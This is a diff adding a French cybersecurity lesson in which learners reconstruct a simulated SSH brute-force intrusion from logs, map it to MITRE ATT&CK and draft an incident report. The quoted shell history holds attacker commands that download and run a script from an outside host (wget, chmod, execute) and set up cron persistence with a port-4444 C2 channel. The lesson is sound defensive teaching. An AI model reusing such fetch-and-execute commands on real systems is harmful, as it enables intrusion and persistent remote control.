@@ -1,0 +1,167 @@
+---
+refCode: CL-LSN-144-V01
+slug: blueteam-projet-incident
+title: "Projet : analyser un incident de bout en bout"
+description: "Endossez le rôle de l'analyste : à partir d'un scénario et d'extraits de journaux, reconstituez une attaque de l'accès initial à son objectif, cartographiez-la sur MITRE ATT and CK et rédigez un rapport d'incident."
+category: CYBERSEC
+difficulty: ADVANCED
+estimatedMinutes: 75
+xpReward: 800
+prerequisites: ["CL-LSN-143-V01"]
+---
+
+Voilà le dernier exercice du parcours. Plus de cours magistral cette fois : tu prends le poste de l'analyste de garde, et on te confie un incident à éclaircir.
+
+Le scénario tient en une phrase. Lundi matin, l'outil de surveillance réseau remonte une alerte : le serveur web01 émet du trafic sortant vers une adresse inconnue, sur un port qui n'a rien à faire là. Ce serveur héberge un site vitrine, il ne devrait parler qu'au reverse proxy et à la base de données. Quelque chose cloche.
+
+Ton travail : comprendre comment l'attaquant est entré, ce qu'il a fait une fois dedans, où il en est, puis écrire un rapport que ton responsable pourra lire sans avoir besoin de toi pour le traduire. Tout ce que tu as appris dans les onze leçons précédentes sert ici.
+
+## les données à disposition
+
+On t'a copié trois sources depuis le serveur, avant de l'isoler du réseau.
+
+- `auth.log` : le journal d'authentification système, qui enregistre chaque tentative de connexion SSH, réussie ou non.
+- `.bash_history` de l'utilisateur `deploy` : la liste des commandes tapées dans le shell, dans l'ordre.
+- la sortie d'une capture des connexions réseau actives au moment de l'alerte.
+
+<Callout type="info">
+Trois sources suffisent souvent à reconstituer une intrusion complète. Le réflexe utile n'est pas d'avoir plus de logs, mais de les croiser : une heure dans auth.log doit correspondre à une commande dans l'historique, qui doit correspondre à une connexion réseau. Quand les trois racontent la même histoire, tu tiens ta chronologie.
+</Callout>
+
+## étape 1 : l'accès initial
+
+On commence par la porte d'entrée. Dans `auth.log`, on cherche les échecs de mot de passe, puis on regarde si l'un d'eux finit par aboutir.
+
+<SimulatedTerminal shell="bash" scenario="bash" title="Analyser les journaux de la machine touchée" commands={{"grep 'Failed password' auth.log | grep -oE '([0-9]+\\.){3}[0-9]+' | sort | uniq -c | sort -rn | head -1": "287 203.0.113.9", "grep 'Accepted password' auth.log": "Jan 10 03:14:02 web01 sshd: Accepted password for deploy from 203.0.113.9", "cat /home/deploy/.bash_history | tail -4": "wget http://203.0.113.9/m.sh\nchmod +x m.sh\n./m.sh\ncrontab -e", "ss -tnp | grep 4444": "ESTAB 0 0 10.0.0.12:50122 203.0.113.9:4444"}} />
+
+La première commande est parlante : 287 échecs de connexion venant tous de la même adresse, `203.0.113.9`. Ce volume sur un compte unique, c'est une attaque par force brute, pas un collègue qui se trompe de mot de passe.
+
+La deuxième commande règle la question du résultat. La force brute a fini par marcher :
+
+```text
+Jan 10 03:14:02 web01 sshd: Accepted password for deploy from 203.0.113.9
+```
+
+À 03h14, le compte `deploy` accepte une connexion depuis la même IP que les 287 échecs. Le mot de passe était trop faible. L'attaquant est entré.
+
+## étape 2 : ce que l'attaquant a fait
+
+Maintenant qu'on sait quand et comment, on regarde ce qui s'est passé une fois la session ouverte. L'historique du shell donne la suite des actions :
+
+```text
+wget http://203.0.113.9/m.sh
+chmod +x m.sh
+./m.sh
+crontab -e
+```
+
+Quatre lignes, et tout y est. Il télécharge un script depuis son propre serveur avec `wget`, le rend exécutable avec `chmod +x`, le lance, puis ouvre l'éditeur de tâches planifiées avec `crontab -e`. Cette dernière commande sert à se rendre persistant : même si le serveur redémarre ou si la session SSH se ferme, une tâche planifiée relancera son code.
+
+Restait à confirmer le trafic sortant signalé par l'alerte. La capture des connexions montre une session établie depuis web01 vers le serveur de l'attaquant, sur le port 4444 :
+
+```text
+ESTAB 0 0 10.0.0.12:50122 203.0.113.9:4444
+```
+
+Le port 4444 est un classique des outils d'accès distant. C'est le canal de commande et contrôle : le script téléchargé maintient une connexion ouverte vers l'extérieur pour recevoir des ordres. C'est exactement ce trafic qui a déclenché l'alerte de départ.
+
+## étape 3 : reconstituer la chronologie
+
+On a tous les morceaux, il faut les remettre dans l'ordre. Chaque événement a une heure ou une place dans l'historique, ce qui suffit à dérouler le fil.
+
+<Diagram caption="La chronologie reconstituée de l'incident">
+flowchart TD
+  A[02h40 force brute SSH 287 echecs depuis 203.0.113.9] --> B[03h14 connexion reussie compte deploy]
+  B --> C[Telechargement du script m.sh par wget]
+  C --> D[Execution du script chmod plus et lancement]
+  D --> E[Persistance via crontab tache planifiee]
+  E --> F[Canal C2 etabli vers 203.0.113.9 port 4444]
+</Diagram>
+
+Lue dans cet ordre, l'attaque est limpide : forcer l'entrée, ouvrir une session, déposer un outil, l'exécuter, s'ancrer pour durer, puis téléphoner à la maison. C'est un schéma qu'on retrouve dans une grande partie des intrusions opportunistes.
+
+## étape 4 : cartographier sur ATT and CK
+
+Pour qu'un autre analyste comprenne ton enquête sans relire tous les logs, on traduit chaque action dans le vocabulaire commun de MITRE ATT and CK. Une tactique répond à la question pourquoi, une technique à la question comment.
+
+| Action observée | Tactique | Technique |
+| --- | --- | --- |
+| 287 échecs SSH puis connexion réussie | Accès initial | Brute Force (T1110) |
+| `wget m.sh` puis `./m.sh` | Exécution | Command and Scripting Interpreter (T1059) |
+| `crontab -e` pour planifier le code | Persistance | Scheduled Task/Job (T1053) |
+| Session sortante vers le port 4444 | Commande et contrôle | Application Layer Protocol (T1071) |
+
+Ce tableau, c'est le coeur technique du rapport. Quatre lignes qui disent où l'attaquant en est dans sa progression : il a un accès stable et un canal de pilotage, mais on ne voit pas encore d'exfiltration de données ni de mouvement vers d'autres machines. C'est une bonne nouvelle, à condition d'agir vite.
+
+## étape 5 : le rapport
+
+Le rapport n'est pas un exercice de style. Il doit permettre à quelqu'un de décider en cinq minutes. On garde une structure fixe : résumé, chronologie, portée, ce qu'on fait tout de suite, ce qu'on change ensuite.
+
+<Callout type="success">
+Un bon rapport d'incident répond à trois questions avant tout : qu'est-ce qui s'est passé, jusqu'où ça va, et qu'est-ce qu'on fait maintenant. Le reste est du détail utile mais secondaire. Si ton responsable doit te rappeler pour comprendre, le rapport a raté sa cible.
+</Callout>
+
+Voici un gabarit que tu peux réutiliser tel quel :
+
+```text
+RAPPORT D'INCIDENT - web01
+Date de detection : 10 janvier, 09h12
+Analyste : [ton nom]
+
+RESUME
+Compromission du serveur web01 via force brute SSH sur le compte
+deploy. Acces obtenu a 03h14. Script malveillant deploye, persistance
+par tache planifiee, canal C2 actif vers 203.0.113.9:4444.
+
+PORTEE
+Une machine touchee (web01, 10.0.0.12). Pas d'indice de mouvement
+lateral ni d'exfiltration a ce stade. Compte concerne : deploy.
+
+CONFINEMENT (immediat)
+- Serveur isole du reseau.
+- Blocage de 203.0.113.9 au pare-feu (entrant et sortant).
+- Session SSH de l'attaquant coupee.
+
+ERADICATION
+- Suppression de la tache crontab malveillante et du fichier m.sh.
+- Rotation du mot de passe du compte deploy.
+- Reconstruction du serveur depuis une image saine recommandee.
+
+RECOMMANDATIONS
+- Activer le 2FA sur tous les acces SSH.
+- Interdire l'authentification SSH par mot de passe (cle uniquement).
+- Mettre en place une alerte sur les echecs SSH repetes.
+```
+
+## ce qu'on aurait pu détecter plus tôt
+
+L'alerte a sauvé la mise, mais elle s'est déclenchée tard, après l'installation de la persistance et l'ouverture du canal C2. Or le signal était présent dès 02h40 : 287 échecs SSH en quelques minutes depuis une seule IP, ça ne ressemble à rien de légitime.
+
+Une règle de détection simple aurait levé l'alarme bien avant : compter les échecs SSH par adresse source sur une fenêtre glissante, et alerter au-delà d'un seuil, par exemple dix échecs en une minute. C'est le principe de fail2ban et de la plupart des règles SIEM. Mieux encore, bloquer automatiquement l'IP après ce seuil aurait empêché la connexion réussie de 03h14. La leçon pour la prochaine fois tient en une phrase : surveille les tentatives, pas seulement les réussites.
+
+## à toi de jouer
+
+Reprends les sources et vérifie un dernier point par toi-même : confirme que l'IP qui a réussi à se connecter est bien la même que celle qui faisait de la force brute, et identifie le port du canal sortant.
+
+<SimulatedTerminal shell="bash" scenario="bash" title="Confirmer le lien entre force brute et accès réussi" commands={{"grep 'Accepted password' auth.log | grep -oE '([0-9]+\\.){3}[0-9]+'": "203.0.113.9", "grep -c 'Failed password' auth.log": "287", "ss -tnp | grep ESTAB | grep -oE ':[0-9]+ ' | tail -1": ":4444 "}} />
+
+<QuizGroup>
+
+<Quiz id="q-1" question="Dans quel ordre l'attaque s'est-elle déroulée ?" options={["Persistance, force brute, exécution, commande et contrôle", "Force brute, accès initial, exécution, persistance, commande et contrôle", "Commande et contrôle, exécution, force brute, persistance", "Exécution, persistance, force brute, accès initial"]} correct={1} />
+
+<Quiz id="q-2" question="Quelle recommandation aurait le plus directement empêché l'accès initial observé ici ?" options={["Augmenter la taille du disque du serveur", "Interdire l'authentification SSH par mot de passe et imposer des clés", "Changer le port du site web de 80 vers 8080", "Ajouter plus de RAM au serveur"]} correct={1} />
+
+<Quiz id="q-3" question="La commande crontab -e dans l'historique correspond à quelle tactique ATT and CK ?" options={["Accès initial", "Exfiltration", "Persistance", "Reconnaissance"]} correct={2} />
+
+</QuizGroup>
+
+## à retenir
+
+- L'incident a suivi un schéma classique : force brute SSH sur un compte à mot de passe faible, dépôt d'un script, persistance par tâche planifiée, canal C2 sur le port 4444.
+- Croiser trois sources suffit souvent : auth.log donne l'entrée, l'historique du shell donne les actions, la capture réseau confirme le canal sortant. Les heures doivent concorder.
+- Cartographier sur ATT and CK traduit l'enquête en vocabulaire partagé : Brute Force (T1110), Command and Scripting Interpreter (T1059), Scheduled Task (T1053), Application Layer Protocol (T1071).
+- Un rapport d'incident répond à trois questions : ce qui s'est passé, la portée, ce qu'on fait maintenant. Confinement d'abord, éradication ensuite, recommandations pour éviter la récidive.
+- Le signal était détectable dès le début : surveiller les échecs d'authentification répétés, et pas seulement les connexions réussies, aurait coupé l'attaque avant l'accès.
+- Ce projet referme le parcours : collecte de preuves, lecture de journaux, analyse réseau, modèle ATT and CK et communication d'incident, tout y passe en une seule enquête.
+
+OK 12 écrit
